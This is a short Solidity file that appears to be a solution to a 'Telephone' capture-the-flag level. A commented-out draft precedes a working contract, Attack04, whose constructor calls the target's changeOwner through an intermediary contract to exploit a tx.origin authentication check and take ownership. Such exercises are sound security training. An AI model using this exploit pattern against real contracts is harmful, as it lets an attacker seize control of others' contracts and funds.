// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "interfaces/itelephone.sol";
import "./04-telephone.sol";

// contract Attack04 {
//     ITelephone private immutable target;
//     address private owner;

//     constructor(address _target) {
//         owner = msg.sender;
//         target = ITelephone(_target); // ToDo - check it works
//     }

//     function changeOwner(address _owner) public {
//         if (tx.origin != msg.sender) {
//             owner = _owner;
//         }
//     }
// }

contract Attack04 {
    constructor(address _target) {
        Telephone(_target).changeOwner(msg.sender);
    }
}
